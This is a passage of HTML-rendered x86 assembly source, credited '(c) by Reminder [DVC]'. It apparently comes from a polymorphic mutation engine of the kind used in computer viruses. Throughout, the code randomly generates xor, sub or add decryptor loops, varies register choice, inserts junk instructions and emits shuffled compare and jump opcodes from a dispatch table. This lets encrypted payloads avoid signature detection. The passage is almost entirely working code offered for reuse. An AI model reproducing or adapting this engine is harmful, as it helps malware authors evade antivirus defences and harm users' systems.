</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.cryptmethod</span><span class="sc4">],</span><span class="sc2">29h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">h_xor_gen</span><span class="sc0">

</span><span class="sc5">h_xor2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc0"> </span><span class="sc1">; sub  ;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.cryptmethod</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">h_xor_gen</span><span class="sc0">

</span><span class="sc5">h_xor3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.cryptmethod</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">h_xor_gen</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.e_xor</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">                       </span><span class="sc1">; base</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@_2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">@_2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.do</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; not xchg registers more</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------inc----------</span><span class="sc0">
</span><span class="sc5">h_inc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------cmp----------</span><span class="sc0">
</span><span class="sc5">h_cmp1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.e_cmp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">                       </span><span class="sc1">; base</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.b2</span><span class="sc4">],</span><span class="sc12">'8'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">real</span><span class="sc0">

</span><span class="sc5">h_cmp2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.e_cmp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">                       </span><span class="sc1">; base</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.b2</span><span class="sc4">],</span><span class="sc12">'3'</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_gen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">@776</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.UsedReg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; - Unset ;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc1">;xchg place registers   -  first where cmp ax,si  (ax - promez, si - index)</span><span class="sc0">
                </span><span class="sc1">;       -  second where cmp si,ax (ax - promex, si - index)</span><span class="sc0">
                </span><span class="sc1">;          flags bellow must be changed</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">second</span><span class="sc0">

</span><span class="sc5">first</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.b1</span><span class="sc4">],</span><span class="sc12">'F'</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">as12</span><span class="sc0">
                        </span><span class="sc1">; must be ja,jae,jnz</span><span class="sc0">
</span><span class="sc5">second</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.b1</span><span class="sc4">],</span><span class="sc12">'S'</span><span class="sc0">

                </span><span class="sc1">; must be jb.jbe,jnz</span><span class="sc0">

</span><span class="sc5">as12</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc1">;------- pushf or lahf ---</span><span class="sc0">
</span><span class="sc5">real</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; of ax used then pushf</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_pushf</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">_pushf</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9fh</span><span class="sc0">  </span><span class="sc1">; lahf</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.b3</span><span class="sc4">],</span><span class="sc12">'L'</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.UsedReg</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; ax now is used</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">_pushf</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9ch</span><span class="sc0">   </span><span class="sc1">; pushf</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.b3</span><span class="sc4">],</span><span class="sc12">'P'</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------jnz----------</span><span class="sc0">
</span><span class="sc5">h_jnz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;---- popf or sahf ----</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc5">bx.e_cmp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9dh</span><span class="sc0">  </span><span class="sc1">; popf</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.b3</span><span class="sc4">],</span><span class="sc12">'P'</span><span class="sc0">  </span><span class="sc1">; if pushf</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ala</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">bx.UsedReg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.UsedReg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; ax now is free</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0"> </span><span class="sc1">; sahf</span><span class="sc0">
</span><span class="sc5">ala</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.b2</span><span class="sc4">],</span><span class="sc12">'8'</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">second_j</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.b1</span><span class="sc4">],</span><span class="sc12">'S'</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">second_j</span><span class="sc0">

</span><span class="sc5">first_j</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; ja</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">set_flags</span><span class="sc0">

</span><span class="sc5">second_j</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; jb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc5">set_flags</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bx.e_xor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------- MAIN TABLE ============================</span><span class="sc0">

</span><span class="sc5">inst</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;------------------------------</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; number of dif. instr.</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_push2</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">  </span><span class="sc1">; (mov reg,cs/trash/mov cs,reg)</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_push1</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">  </span><span class="sc1">; addres of 1 handler  (push cs/trash/pop ds )</span><span class="sc0">
</span><span class="sc1">;------------------------------</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_mov1</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc1">;------------------------------</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_mov2</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc1">;------------------------------</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_xor3</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">  </span><span class="sc1">; xor</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_xor2</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">  </span><span class="sc1">; sub</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_xor1</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">  </span><span class="sc1">; add</span><span class="sc0">
</span><span class="sc1">;------------------------------</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_inc</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc1">;------------------------------</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_cmp2</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">  </span><span class="sc1">; 3</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_cmp1</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">  </span><span class="sc1">; 8</span><span class="sc0">
</span><span class="sc1">;------------------------------</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">h_jnz</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc1">;------------------------------</span><span class="sc0">
</span><span class="sc5">len_inst</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">inst</span><span class="sc0">
</span><span class="sc5">LenOfInstr</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;================================ резать тут ============================</span><span class="sc0">



</span><span class="sc1">;                                        (c) by Reminder [DVC]</span></div></body>
</html>
